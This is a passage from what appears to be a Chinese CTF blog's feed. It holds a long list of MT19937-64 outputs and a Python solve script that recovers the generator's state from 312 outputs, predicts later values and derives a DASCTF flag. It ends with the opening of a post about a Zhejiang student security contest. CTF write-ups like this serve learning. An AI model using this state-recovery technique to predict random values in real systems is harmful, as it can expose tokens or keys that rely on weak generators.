class="number">17634355913948865190</span>, <span class="number">18230067880107976101</span>, <span class="number">14647282067432289184</span>, <span class="number">2666571742016867486</span>, <span class="number">35944775638564196</span>, <span class="number">13202068495097382260</span>, <span class="number">9200881323819852309</span>, <span class="number">4609224846213708248</span>, <span class="number">18385087669463550574</span>, <span class="number">10907111573029619720</span>, <span class="number">3677665280613822779</span>, <span class="number">7175067246924173873</span>, <span class="number">11557554314793111361</span>, <span class="number">16459269098754836930</span>, <span class="number">15069426419433415372</span>, <span class="number">3478942161672373533</span>, <span class="number">1475410410806061275</span>, <span class="number">3951913608914307936</span>, <span class="number">9031385401155758661</span>, <span class="number">3487921219891556908</span>, <span class="number">14331439795449455643</span>, <span class="number">18005194978393081205</span>, <span class="number">17499558816128213969</span>, <span class="number">10013697255070423725</span>, <span class="number">5656707783041395866</span>, <span class="number">8245156232824114523</span>, <span class="number">5484825401635850101</span>, <span class="number">18276565390397117490</span>, <span class="number">9806016278660472039</span>, <span class="number">6246223529755503034</span>, <span class="number">16322603114524844950</span>, <span class="number">13512386112109766619</span>, <span class="number">4292997062471342719</span>, <span class="number">5482339873158479974</span>, <span class="number">12153068771020641259</span>, <span class="number">18134128714075076811</span>, <span class="number">3921582705345984456</span>, <span class="number">17990063870067007106</span>, <span class="number">11893303237020637674</span>, <span class="number">584000375933180982</span>, <span class="number">6837860293438757570</span>, <span class="number">8668590806728300645</span>, <span class="number">10930322698482157784</span>, <span class="number">3456591010166906694</span>, <span class="number">8479176164660731035</span>, <span class="number">1378913458575066776</span>, <span class="number">11867206231852016448</span>, <span class="number">11155774780214677606</span>, <span class="number">912636353429261442</span>, <span class="number">17286540002553508524</span>, <span class="number">2342876557589322779</span>, <span class="number">8472494814582696749</span>, <span class="number">1649463863153987977</span>, <span class="number">6639761134830802698</span>, <span class="number">17749792536888103944</span>, <span class="number">6682611142368155837</span>, <span class="number">8961391229631067960</span>, <span class="number">16808632462882238050</span>, <span class="number">12764361808843833740</span>, <span class="number">3494650449008997672</span>, <span class="number">13464542575897195823</span>, <span class="number">424905026997643448</span>, <span class="number">6949880018570988189</span>, <span class="number">4352171970901905656</span>, <span class="number">7585977087659274602</span>, <span class="number">9963800442502096068</span>, <span class="number">11967585318365690786</span>, <span class="number">1330206767381639342</span>, <span class="number">8961211309807685961</span>, <span class="number">12822173985081341335</span>, <span class="number">4508173450257371182</span>, <span class="number">5828692808060501375</span>, <span class="number">7437728885533218362</span>, <span class="number">11924888116770741814</span>, <span class="number">2012177013990519412</span>, <span class="number">6499123439580002081</span>, <span class="number">13085942749253543550</span>, <span class="number">12967954280047984193</span>, <span class="number">401135611301783756</span>, <span class="number">3748733649551258520</span>, <span class="number">3742761952933734129</span>, <span class="number">7180568637515019340</span>, <span class="number">8490711531714639868</span>, <span class="number">1461899626173313114</span>, <span class="number">15357996742461975417</span>, <span class="number">14566908736002266815</span>, <span class="number">18368411028248688780</span>, <span class="number">2276282088146233438</span>, <span class="number">13500510232438577028</span>, <span class="number">5042075854511929699</span>, <span class="number">6430943865985944461</span>, <span class="number">4611615451136427723</span>, <span class="number">16501718400150227301</span>, <span class="number">12689032035555572221</span>, <span class="number">15097412730296922717</span>, <span class="number">3917094315801026114</span>, <span class="number">2738852375492418821</span>, <span class="number">16365967597393176630</span>, <span class="number">15062401340541737624</span>, <span class="number">14638139755970734808</span>, <span class="number">17586333334851266372</span>, <span class="number">17319918915751492871</span>, <span class="number">11845068873340136881</span>, <span class="number">1459249680175909613</span>, <span class="number">7472745361441793631</span>, <span class="number">1812384806700690960</span>, <span class="number">8855007047564417997</span>, <span class="number">2163690632469050637</span>, <span class="number">1883216720349119806</span>, <span class="number">17992478845633263598</span>, <span class="number">4665099551190282678</span>, <span class="number">11678011021345341884</span>, <span class="number">14187013186800119116</span>, <span class="number">14052476937717753457</span>, <span class="number">14759086517840933234</span>, <span class="number">5009467219504023390</span>, <span class="number">4622766434224603629</span>, <span class="number">14306333222661486071</span>, <span class="number">3858064603145888263</span>, <span class="number">5480134807934395111</span>, <span class="number">4123024571389908319</span>, <span class="number">4857052736700414325</span>, <span class="number">16243980005326285458</span>, <span class="number">3632766067814039781</span>, <span class="number">710008964341406746</span>, <span class="number">5363960844618609694</span>, <span class="number">14114730195035015808</span>, <span class="number">16428297947621094568</span>, <span class="number">7700974694607772814</span>, <span class="number">16793381582485703202</span>, <span class="number">13948380472150916306</span>, <span class="number">14326581900789123198</span>, <span class="number">4228968193234651142</span>, <span class="number">11100829582225662535</span>, <span class="number">17495023276082596914</span>, <span class="number">8634787791698085471</span>, <span class="number">6145765583313197421</span>, <span class="number">16788430897014030178</span>, <span class="number">11435692770927277650</span>, <span class="number">18065086017618584565</span>, <span class="number">11769581244567937207</span>, <span class="number">13278489473631493919</span>, <span class="number">8019460929320111149</span>, <span class="number">5693618935245539106</span>, <span class="number">3634811597737081216</span>, <span class="number">12859793273631344580</span>, <span class="number">11287301384880619752</span>, <span class="number">18394782048366983264</span>, <span class="number">7421132200962846807</span>, <span class="number">4084540937457316264</span>, <span class="number">13113874388366064762</span>, <span class="number">8131358879566215449</span>, <span class="number">18127561595469413694</span>, <span class="number">8734770900165404534</span>, <span class="number">17424357262393464853</span>, <span class="number">10097252723684474013</span>, <span class="number">13657127819021358228</span>, <span class="number">15053911843606144518</span>, <span class="number">7213762907694003185</span>, <span class="number">9201850376693257882</span>, <span class="number">1152437224214832892</span>, <span class="number">14749316667846084768</span>, <span class="number">13945981875336291326</span>, <span class="number">17205113012613835387</span>, <span class="number">17208682023098019636</span>, <span class="number">16837244935188768969</span>, <span class="number">1562887481274292099</span>, <span class="number">4817091557053520861</span>, <span class="number">12788128805488570720</span>, <span class="number">12001115261194850091</span>, <span class="number">4003771944165077120</span>, <span class="number">2234627252583081046</span>, <span class="number">9648802166794733209</span>, <span class="number">2217782127954322431</span>, <span class="number">8813298931273365931</span>, <span class="number">8055654179906713224</span>, <span class="number">11975882101529377223</span>, <span class="number">3484952924454621378</span>, <span class="number">9405558259370977621</span>, <span class="number">10465136460923462995</span>, <span class="number">10114188036427722127</span>, <span class="number">3137605056932583175</span>, <span class="number">6052770256806365938</span>, <span class="number">13216705997825407019</span>, <span class="number">9321595432845767721</span>, <span class="number">7404913363748792748</span>, <span class="number">3104222247113734338</span>, <span class="number">7884841839505302190</span>, <span class="number">10282600744363227974</span>, <span class="number">10560288140635802837</span>, <span class="number">345714099277926722</span>, <span class="number">14827599919753819919</span>, <span class="number">15348137034782912153</span>, <span class="number">117188792560235416</span>, <span class="number">721765732450403598</span>, <span class="number">13484574492955662118</span>, <span class="number">4088456941206683834</span>, <span class="number">7978001820773876706</span>, <span class="number">3458688202384309003</span>, <span class="number">7297824025882346112</span>, <span class="number">8366103370544240004</span>, <span class="number">14726906913567147182</span>, <span class="number">17890463553725848943</span>, <span class="number">11056300998383817861</span>, <span class="number">12172218496062907284</span>, <span class="number">5614991059403362329</span>, <span class="number">94695117905761066</span>, <span class="number">13704554396573869457</span>, <span class="number">6942259376738368761</span>, <span class="number">3724125954238286617</span>, <span class="number">605665642089906206</span>, <span class="number">4440357634786283101</span>, <span class="number">9312356527281045726</span>, <span class="number">18433419763563298916</span>, <span class="number">5537070555239228268</span>, <span class="number">13655980751929630271</span>, <span class="number">11097112793938372280</span>, <span class="number">7029091093125181071</span>, <span class="number">15682558111863651240</span>, <span class="number">9864810256451039130</span>, <span class="number">5940287037201593945</span>, <span class="number">7230113292992804565</span>, <span class="number">1262540470928338201</span>, <span class="number">9310270195989362278</span>, <span class="number">5911475921308141211</span>, <span class="number">5943394248414176333</span>, <span class="number">2467090711423218798</span>, <span class="number">14834589937967531968</span>, <span class="number">2112412521637455955</span>, <span class="number">4483762121635552341</span>, <span class="number">9203453183301626690</span>, <span class="number">12517949271946792756</span>, <span class="number">11765267562048769695</span>, <span class="number">2130431799048385018</span>, <span class="number">1021118212271885825</span>, <span class="number">4527525148317213493</span>, <span class="number">2666979235110630076</span>, <span class="number">11385323575772505236</span>, <span class="number">1957143482002768471</span>, <span class="number">6653869545594001852</span>, <span class="number">9403787903811093312</span>, <span class="number">8793399260966849492</span>, <span class="number">9134129177479686128</span>, <span class="number">5344549741728076030</span>, <span class="number">3785525706196259331</span>, <span class="number">4098427281238979781</span>, <span class="number">14780185570363454606</span>, <span class="number">15022528285132147394</span>, <span class="number">4415868057026363350</span>, <span class="number">11652850077219368760</span>, <span class="number">6599101465769202844</span>, <span class="number">2324709069440458374</span>, <span class="number">2328030874184313596</span>, <span class="number">5375810578496425005</span>, <span class="number">3324352283736262699</span>, <span class="number">8961596405474061089</span>, <span class="number">17555556238164816340</span>, <span class="number">1217170962166712882</span>, <span class="number">12300833475020082526</span>, <span class="number">5755163501951705747</span>, <span class="number">17673007557139716816</span>, <span class="number">5400175616849815689</span>, <span class="number">16424974447872124521</span>, <span class="number">3528336073009821153</span>, <span class="number">5677112613986511204</span>, <span class="number">11681713850480599971</span>, <span class="number">17889123911033641068</span>, <span class="number">13398947136669841280</span>, <span class="number">14362332277634552597</span>, <span class="number">12612291562289233371</span>, <span class="number">9068021764334224282</span>, <span class="number">11003726667849614111</span>, <span class="number">170500049009536169</span>, <span class="number">11787850295471586749</span>, <span class="number">17738376378319933104</span>, <span class="number">265438126753187088</span>, <span class="number">16449969716110589415</span>, <span class="number">4267181961918958684</span>, <span class="number">8504721844419720345</span>, <span class="number">3602399335681951800</span>, <span class="number">16377130351527521329</span>, <span class="number">137205552767822057</span>, <span class="number">15076083541717516190</span>, <span class="number">16933079658536833273</span>, <span class="number">11539760435976559163</span>, <span class="number">10349113249022571006</span>, <span class="number">13506623588121209051</span>, <span class="number">1767257281718218581</span>, <span class="number">55497369433803178</span>, <span class="number">9620183217554454747</span>, <span class="number">352109299759977748</span>, <span class="number">13362871402671548794</span>, <span class="number">3245933715092323519</span>, <span class="number">7098945802580095824</span>, <span class="number">4749740144906242542</span>, <span class="number">16475573756134089178</span>, <span class="number">17665764356947420150</span>, <span class="number">2428128185580929142</span>, <span class="number">10865799872171434959</span>, <span class="number">14020645350131532589</span>, <span class="number">10866919792482735515</span>, <span class="number">1639413999413384841</span>, <span class="number">2660467607619573650</span>, <span class="number">7176921049243916372</span>, <span class="number">44929497464104249</span>, <span class="number">8302026006819056308</span>, <span class="number">14088827593384756939</span>, <span class="number">4541386427308185948</span>, <span class="number">14992023310005249339</span>, <span class="number">11521110449882379692</span>, <span class="number">8618468396936995487</span>, <span class="number">17255690317020962535</span>, <span class="number">14459878492479278129</span>, <span class="number">484161739083752565</span>, <span class="number">8967126682428339806</span>, <span class="number">12208164843579773375</span>, <span class="number">11736932142677088849</span>, <span class="number">7727530756457513692</span>, <span class="number">3829808422387045462</span>, <span class="number">9815185898534079561</span>, <span class="number">8586014595553015140</span>, <span class="number">3121180959957037281</span>, <span class="number">546542310230906996</span>, <span class="number">12788213799003801890</span>, <span class="number">6764098612553553982</span>, <span class="number">16230764669201238834</span>, <span class="number">18205877184448874064</span>, <span class="number">17741584570061449195</span>, <span class="number">13498693246362717293</span>, <span class="number">12557996638970667763</span>, <span class="number">16240767280840697248</span>, <span class="number">12688455377024311919</span>, <span class="number">11821568382422290340</span>, <span class="number">13694830011903255027</span>, <span class="number">15977888673915506876</span>, <span class="number">12346885892635259078</span>, <span class="number">7838634663919088845</span>, <span class="number">13697951298959265290</span>, <span class="number">16396403340832798324</span>, <span class="number">5570724586621569543</span>, <span class="number">348190538972825181</span>, <span class="number">498434119496336507</span>, <span class="number">4629603637537989875</span>, <span class="number">2904956541370261046</span>, <span class="number">15056806750205280060</span>, <span class="number">12512751698356956353</span>, <span class="number">11598492895309981739</span>, <span class="number">5900963668615601483</span>, <span class="number">9286588840856606265</span>, <span class="number">14687331465648814630</span>, <span class="number">724531149460506959</span>, <span class="number">17016613597390705501</span>, <span class="number">17860966464838170961</span>, <span class="number">8082441243109422217</span>, <span class="number">4226070025033485357</span>, <span class="number">11557581090421115709</span>, <span class="number">1365974406386375567</span>, <span class="number">11626532849062235723</span>, <span class="number">3026767794107211866</span>, <span class="number">18265729906007136324</span>, <span class="number">9752072017332967624</span>, <span class="number">8344899021234511823</span>, <span class="number">17168023990850847933</span>, <span class="number">2108491903973827339</span>, <span class="number">16946871590663953204</span>, <span class="number">15268856540448037497</span>, <span class="number">6729814538132205074</span>, <span class="number">10608459573931314294</span>, <span class="number">5349389425094153624</span>, <span class="number">9119249437078259281</span>, <span class="number">3022057742231131843</span>, <span class="number">699495075963768616</span>, <span class="number">3938180359891046702</span>, <span class="number">3132000820601213475</span>, <span class="number">6453763775620458305</span>, <span class="number">10361983187468507141</span>, <span class="number">18091129984666032675</span>, <span class="number">4573010375750843342</span>, <span class="number">791243713554231377</span>, <span class="number">6523321933147523990</span>, <span class="number">2460943155031244372</span>, <span class="number">11915079949168514844</span>, <span class="number">10962272930784254451</span>, <span class="number">7828398430854164950</span>, <span class="number">11580373300607261323</span>, <span class="number">14496114508805667408</span>, <span class="number">12800088002722989479</span>, <span class="number">4489382774379581027</span>, <span class="number">6241885538530491013</span>, <span class="number">15369736452242646419</span>, <span class="number">18339907485699833664</span>, <span class="number">14843607724306799380</span>, <span class="number">15883998472835946312</span>, <span class="number">13401911608426527924</span>, <span class="number">3615974264171478906</span>, <span class="number">2951259064496198811</span>, <span class="number">7803436242736563826</span>, <span class="number">4135188636826481442</span>, <span class="number">5021264042001895982</span>, <span class="number">5708915960985917130</span>, <span class="number">11181910501244483073</span>, <span class="number">5573954009605843738</span>, <span class="number">3021445895744683140</span>, <span class="number">10033196279958934660</span>, <span class="number">2680855996735532569</span>, <span class="number">5360189858868901361</span>, <span class="number">8167521138921792938</span>, <span class="number">6161893524269697852</span>, <span class="number">5558764473993615110</span>, <span class="number">13408224815379298518</span>, <span class="number">17751136251534065932</span>, <span class="number">12169040946650623409</span>, <span class="number">8591752444091873275</span>, <span class="number">17571132974848304944</span>, <span class="number">16886102890910720967</span>, <span class="number">10434431909683674783</span>, <span class="number">1798513582887417581</span>, <span class="number">4922950544911394484</span>, <span class="number">436078592099283889</span>, <span class="number">10061099463464191790</span>, <span class="number">2611739359719785328</span>, <span class="number">12076811020743303539</span>, <span class="number">2799012545596479383</span>, <span class="number">12408665237686526887</span>, <span class="number">2569240801657154200</span>, <span class="number">189527510828503181</span>, <span class="number">17204452437985213973</span>, <span class="number">15873367317020085673</span>, <span class="number">4668478220806245681</span>, <span class="number">2950905851413543275</span>, <span class="number">17244737907264565987</span>, <span class="number">9947196811151946334</span>, <span class="number">10861412944742179841</span>, <span class="number">17691963506930352</span>, <span class="number">8645426666922253783</span>, <span class="number">5429177116065336723</span>, <span class="number">9148166318339274858</span>, <span class="number">1140817301847500253</span>, <span class="number">16395024534726001957</span>, <span class="number">14455719375367518785</span>, <span class="number">14365592159046307404</span>, <span class="number">4233672053992875940</span>, <span class="number">7055944177387857447</span>, <span class="number">13438827615850026797</span>, <span class="number">1980459165532258112</span>, <span class="number">9924227990341676772</span>, <span class="number">1258768952545009550</span>, <span class="number">11361136852134788879</span>, <span class="number">4300533493752614933</span>, <span class="number">14681866951052377042</span>, <span class="number">8810851615125798911</span>, <span class="number">8542930103562314876</span>, <span class="number">14579475506918455576</span>, <span class="number">16047523528880779866</span>, <span class="number">1380610643416544755</span>, <span class="number">12076763661431463653</span>, <span class="number">13633351579395427301</span>, <span class="number">14309637244904670356</span>, <span class="number">2784919727650036805</span>, <span class="number">10011701223131936197</span>, <span class="number">16483582182156980016</span>, <span class="number">8123259590358566068</span>, <span class="number">15547670775408355653</span>, <span class="number">17114873767724596286</span>, <span class="number">15947690112937005468</span>, <span class="number">7121267006666076401</span>, <span class="number">15013329343112101948</span>, <span class="number">6864703775066800136</span>, <span class="number">2091646091797307547</span>, <span class="number">11775971286169844616</span>, <span class="number">13169145274668540822</span>, <span class="number">18168794334896751614</span>, <span class="number">8757043158271235193</span>, <span class="number">12162217691779194844</span>, <span class="number">10986813166707328024</span>, <span class="number">4635742872437686441</span>, <span class="number">9862874769906586011</span>, <span class="number">5685640425162748748</span>, <span class="number">16154828004824450666</span>, <span class="number">12628559068947614691</span>, <span class="number">18330543771355967176</span>, <span class="number">9613516487817756865</span>, <span class="number">11541501577179857879</span>, <span class="number">14497414068611647595</span>, <span class="number">16303734492840330251</span>, <span class="number">3271500016365005027</span>, <span class="number">3388428085388242514</span>, <span class="number">1510190073604428294</span>, <span class="number">10472797328548283957</span>, <span class="number">9702728991503878250</span>, <span class="number">3428420960955188888</span>, <span class="number">6445224698406122174</span>, <span class="number">5824974369892172376</span>, <span class="number">6434707946773025269</span>, <span class="number">2528556873146891935</span>, <span class="number">6653952898338236677</span>, <span class="number">432032921329160914</span>, <span class="number">11760277815966837524</span>, <span class="number">9034646482280577053</span>, <span class="number">2164586012669056137</span>, <span class="number">2616742534894002775</span>, <span class="number">942200230707617758</span>, <span class="number">5327259632525477213</span>, <span class="number">13158846232145762876</span>, <span class="number">418213563708326684</span>, <span class="number">13494580607955344451</span>, <span class="number">13712793184114793941</span>, <span class="number">13061962736775979494</span>, <span class="number">1304785696522982742</span>, <span class="number">6636575085535497783</span>, <span class="number">2548707152553606937</span>, <span class="number">5179609242429207458</span>, <span class="number">216456340969811386</span>, <span class="number">8504681751639758545</span>, <span class="number">18283819579633351371</span>, <span class="number">8667595238380606433</span>, <span class="number">15751060841552119650</span>, <span class="number">10368350373271876373</span>, <span class="number">2271051687544383713</span>, <span class="number">9387982608299096176</span>, <span class="number">5067191246740902300</span>, <span class="number">2164563749890672481</span>, <span class="number">1441096478400860673</span>, <span class="number">1698497919091504741</span>, <span class="number">7070556267349479512</span>, <span class="number">12383115351862498978</span>, <span class="number">4393914787565756921</span>, <span class="number">4843292715860537520</span>, <span class="number">1308644180050696570</span>, <span class="number">14727896807325886230</span>, <span class="number">5278800618172724513</span>, <span class="number">12682261375578839563</span>, <span class="number">2292210517400729441</span>, <span class="number">4539831393791783686</span>, <span class="number">11184877751085848181</span>, <span class="number">10455063755670025488</span>, <span class="number">4090948952473244180</span>, <span class="number">16140611536328585842</span>, <span class="number">4009612709629840807</span>, <span class="number">11680437954598062018</span>, <span class="number">7483349842877448300</span>, <span class="number">15595722655987483</span>, <span class="number">6218105392300937979</span>, <span class="number">4230977848731176695</span>, <span class="number">13608604339767291094</span>, <span class="number">15450864502883571776</span>, <span class="number">14522043162137067612</span>, <span class="number">17407306325856924818</span>, <span class="number">4319385475362004982</span>, <span class="number">3602607459242950116</span>, <span class="number">12919519173298379659</span>, <span class="number">17034295612889519066</span>, <span class="number">16366395208098028226</span>, <span class="number">16902437965740309665</span>, <span class="number">2976505459482736335</span>, <span class="number">13462949500218242510</span>, <span class="number">9986640179928306819</span>, <span class="number">15767966148754567460</span>, <span class="number">5987675944577047926</span>, <span class="number">908917886808113767</span>, <span class="number">7775521308318543697</span>, <span class="number">8554839413248075973</span>, <span class="number">15830102725396509035</span>, <span class="number">4299599343707193551</span>, <span class="number">151253289791368809</span>, <span class="number">2074429061050605186</span>, <span class="number">7050639080325887498</span>, <span class="number">7147021929133361313</span>, <span class="number">17288365729620621043</span>, <span class="number">13258996835492542256</span>, <span class="number">9813891614733236908</span>, <span class="number">18409516239359796503</span>, <span class="number">6114024626644998222</span>, <span class="number">5075084268262314250</span>, <span class="number">9316231926255260786</span>, <span class="number">5482842808296472097</span>, <span class="number">9445382679464571342</span>, <span class="number">341224484511902160</span>, <span class="number">13784129997188624024</span>, <span class="number">7368235505308494752</span>, <span class="number">9538628927204464393</span>, <span class="number">15343501567237040869</span>, <span class="number">17821228923098686582</span>, <span class="number">11856702827887607105</span>, <span class="number">4609368864524898262</span>, <span class="number">14712861947435117594</span>, <span class="number">10899071438470157317</span>, <span class="number">9590771163252554239</span>, <span class="number">18239878173866313008</span>, <span class="number">17348232285102511866</span>, <span class="number">7979447902828438866</span>, <span class="number">10189744825270231378</span>, <span class="number">15897242279714161903</span>, <span class="number">6814376918912188976</span>, <span class="number">14160295163213869895</span>, <span class="number">3756399085747026247</span>, <span class="number">7851944732036371005</span>, <span class="number">11096596485883534745</span>, <span class="number">17528766768147904271</span>, <span class="number">12327736621720397026</span>, <span class="number">17199643471105880304</span>, <span class="number">1457112013787956971</span>, <span class="number">4273300114441781498</span>, <span class="number">15938254022202331850</span>, <span class="number">12502089261484299213</span>, <span class="number">4148861150304071474</span>, <span class="number">16774360387122462360</span>, <span class="number">4693230099623568126</span>, <span class="number">4923228118836213154</span>, <span class="number">9672193860921898593</span>, <span class="number">12031664828792019070</span>, <span class="number">5538759348099426194</span>, <span class="number">16607999864018217913</span>, <span class="number">12801100377914190264</span>, <span class="number">3714468733303697571</span>, <span class="number">15066120849955539008</span>, <span class="number">8667181143710237426</span>, <span class="number">11054461905529698068</span>, <span class="number">5000947219599965404</span>, <span class="number">13679544882732214263</span>, <span class="number">12329024745774068972</span>, <span class="number">5097030027906429561</span>, <span class="number">623294247887615792</span>, <span class="number">7749632090228054556</span>, <span class="number">7348314875737386281</span>, <span class="number">15051320008802373451</span>, <span class="number">2316565134939415828</span>, <span class="number">15735407710770638384</span>, <span class="number">11219541286219768213</span>, <span class="number">204970242910995613</span>, <span class="number">2942251758669266767</span>, <span class="number">2446839436006958427</span>, <span class="number">5818242570475463614</span>, <span class="number">13952882162210790154</span>, <span class="number">1091967561799274001</span>, <span class="number">815669942787526663</span>, <span class="number">17619502901620723825</span>, <span class="number">16225434478481351091</span>, <span class="number">3458534598924545265</span>, <span class="number">13105176322289080982</span>, <span class="number">11660428227784960936</span>, <span class="number">17456917329772545202</span>, <span class="number">17370020327039448988</span>, <span class="number">9872223534315941551</span>, <span class="number">11134891555868721043</span>, <span class="number">7366592335535613164</span>, <span class="number">17901061154562355983</span>, <span class="number">11133114536770437092</span>, <span class="number">1216102370074140712</span>, <span class="number">12369779197340106392</span>, <span class="number">15587264963667110618</span>, <span class="number">9839321331851277149</span>, <span class="number">9504232653874690416</span>, <span class="number">3277515784377114968</span>, <span class="number">11059930209112798658</span>, <span class="number">2233223095276440320</span>, <span class="number">8766259643725656785</span>, <span class="number">2981451568249872324</span>, <span class="number">16923059343824130016</span>, <span class="number">10424762723653272247</span>, <span class="number">5892364915443744172</span>, <span class="number">5076056599547198181</span>, <span class="number">8353569794147013632</span>, <span class="number">68280038528939863</span>, <span class="number">13688795951892474996</span>, <span class="number">18383293316785491223</span>, <span class="number">16830221144227410771</span>, <span class="number">7584798539822253809</span>, <span class="number">16154968662715915283</span>, <span class="number">15260829610123279933</span>, <span class="number">4877893352139268298</span>, <span class="number">12344113633536211040</span>, <span class="number">12755524932207520008</span>, <span class="number">5908761689287331221</span>, <span class="number">10710685683019125231</span>, <span class="number">13529779487666749860</span>, <span class="number">17058207837744409161</span>, <span class="number">16146404756880670361</span>, <span class="number">479722120166144953</span>, <span class="number">18441286007767994888</span>, <span class="number">291021007503523962</span>, <span class="number">18404478127831570654</span>, <span class="number">7161684062922444049</span>, <span class="number">13215140078849265993</span>, <span class="number">3557093399709796464</span>, <span class="number">8888690439305341966</span>, <span class="number">6505462940112971530</span>, <span class="number">8788739344222162420</span>, <span class="number">1559480144085566061</span>, <span class="number">12347917275519574148</span>, <span class="number">81829582595789879</span>, <span class="number">256554008735570761</span>, <span class="number">13242371414730122957</span>, <span class="number">11233874231428992467</span>, <span class="number">13642556384815692603</span>, <span class="number">15402098527178414517</span>, <span class="number">11899811780905828512</span>, <span class="number">17981855746545737550</span>, <span class="number">4198592355605474429</span>, <span class="number">5837385946994485658</span>, <span class="number">8495884884442446152</span>, <span class="number">14987601548279232776</span>, <span class="number">8084557976601943459</span>, <span class="number">1951816494581368991</span>, <span class="number">9198564418991457621</span>, <span class="number">7932995247156296394</span>, <span class="number">1727181807973386737</span>, <span class="number">6589861619929187838</span>, <span class="number">8606879269790701257</span>, <span class="number">4872437793541536276</span>, <span class="number">15996953415759653811</span>, <span class="number">9248501959204439487</span>, <span class="number">4430871643980849717</span>, <span class="number">14781923535395473967</span>, <span class="number">15369814218152848270</span>, <span class="number">8234249513592097579</span>, <span class="number">17526914633363815278</span>, <span class="number">12602191579658959446</span>, <span class="number">14791379194771288560</span>, <span class="number">5744799145746380430</span>, <span class="number">16286641132134680583</span>, <span class="number">14401259673433035989</span>, <span class="number">8781313506229705992</span>, <span class="number">15404783223179793847</span>, <span class="number">1240592003072635453</span>, <span class="number">6610236446870877009</span>, <span class="number">13844205871835893697</span>, <span class="number">5872162931619514680</span>, <span class="number">7969671272013520825</span>, <span class="number">2766019064081136959</span>, <span class="number">12517751573997673572</span>, <span class="number">9675763639282129596</span>, <span class="number">6287079859085827340</span>, <span class="number">13703850028043029227</span>, <span class="number">2177538632683478842</span>, <span class="number">6799380297638496469</span>, <span class="number">18086402650215147822</span>, <span class="number">6934362201312885542</span>, <span class="number">18313335318052001373</span>, <span class="number">11480263463655438919</span>, <span class="number">9106785110623113711</span>, <span class="number">7886399579140250642</span>, <span class="number">3228263571695418855</span>, <span class="number">16330664963396613091</span>, <span class="number">17040963948964130546</span>, <span class="number">10826606124423646728</span>, <span class="number">2004304733703582220</span>, <span class="number">6398041571715522263</span>, <span class="number">493137561871256273</span>, <span class="number">9640584407491032029</span>, <span class="number">16021497942534243559</span>, <span class="number">3278925318796881775</span>, <span class="number">13963508362353842195</span>, <span class="number">10912881406340519756</span>, <span class="number">12333002179163988752</span>, <span class="number">10955825398678638303</span>, <span class="number">13098738959421529927</span>, <span class="number">4516651215445389327</span>, <span class="number">560548562818360587</span>, <span class="number">6879446280544278794</span>, <span class="number">17586026517062529192</span>, <span class="number">3060809513700298266</span>, <span class="number">10921253043682209150</span>, <span class="number">3096750023591656316</span>, <span class="number">13400270480516947274</span>, <span class="number">14497399820138619643</span>, <span class="number">885203573443562232</span>, <span class="number">14340392236208331243</span>, <span class="number">2009503763921531273</span>, <span class="number">5844055580211151684</span>, <span class="number">11452679420109767541</span>, <span class="number">9889351505080896698</span>, <span class="number">12297221479872520074</span>, <span class="number">145327472993840493</span>, <span class="number">14415741022760094936</span>, <span class="number">8161272693495024070</span>, <span class="number">12628038780375717745</span>, <span class="number">5651066232426624946</span>, <span class="number">6800289990668254787</span>, <span class="number">5629827258100727980</span>, <span class="number">9532683887081871864</span>, <span class="number">17078228306713530437</span>, <span class="number">5752393712365853210</span>, <span class="number">9906279898480007557</span>, <span class="number">15575593797821095372</span>, <span class="number">7944135127159515198</span>, <span class="number">9274370606751170281</span>, <span class="number">8181946307601340138</span>, <span class="number">8855405836683610977</span>, <span class="number">10604653901416893787</span>, <span class="number">11825055110857035062</span>, <span class="number">4735989253296218178</span>, <span class="number">9585945902650058725</span>, <span class="number">16832571384429265203</span>, <span class="number">14392760261562270322</span>, <span class="number">14439958219835048793</span>, <span class="number">6845765491294793435</span>, <span class="number">10537690616100733378</span>, <span class="number">10290121783493343259</span>, <span class="number">17074695699105811516</span>, <span class="number">17508569400297966287</span>, <span class="number">15411447085789948953</span>, <span class="number">10245321407074763960</span>, <span class="number">1474249930147284650</span>, <span class="number">338858065124110851</span>, <span class="number">16523709105734298997</span>, <span class="number">17458843705270839631</span>, <span class="number">11471295397505031119</span>, <span class="number">6285176061334214908</span>, <span class="number">2705374183703063320</span>, <span class="number">12810847959239174924</span>, <span class="number">10260721046212143624</span>, <span class="number">4221085600703449212</span>, <span class="number">1200019904756589653</span>, <span class="number">10460179773211533763</span>, <span class="number">11823018480340155341</span>, <span class="number">9903187458931297940</span>, <span class="number">1139978577616698133</span>, <span class="number">5744593808037898897</span>, <span class="number">16758300938964610655</span>, <span class="number">7359351744825865326</span>, <span class="number">10862900264466009346</span>, <span class="number">3342859891404368697</span>, <span class="number">18254401553280819107</span>, <span class="number">17133307977473573143</span>, <span class="number">11714571723704738721</span>, <span class="number">8944205159183890163</span>]</span><br><span class="line">pre = mt19937_64()</span><br><span class="line">pre.from_output(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, res[:<span class="number">312</span>])))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> rand <span class="keyword">in</span> res[<span class="number">312</span>:]:</span><br><span class="line">    a = pre.random()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(rand) == a:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        FLAG = <span class="string">b&#x27;DASCTF&#123;&#x27;</span> + hashlib.md5(<span class="built_in">str</span>(a).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(FLAG)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>MT19937</tag>
      </tags>
  </entry>
  <entry>
    <title>20211023 第四届浙江省大学生网络与信息安全竞赛（预赛）</title>
    <url>/posts/a2deb6fa/</url>
    <content><![CDATA[<p>呜呜呜，出大问题</p>
<p>复现写WP的时候，Typora突然崩溃，还好这篇博客9我狗命</p>
<p><a href="https://blog.csdn.net/liujun03/article/details/82660303">https://blog.csdn.net/liujun03/article/details/82660303</a></p>
<p>Typora会save没有保存的md，在偏好设置里；Typora！yyds</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029100343661.png" alt="image-20211029100343661"></p>
<p>明天就是决赛了，赶在决赛前复现完</p>
<span id="more"></span>

<p>首先看下机房别的地方ipv4的配置，然后拿来换一个子网的地址</p>
<p>md，配置又搞了半天，实验室请别人分配的，有机会一定学下网络</p>
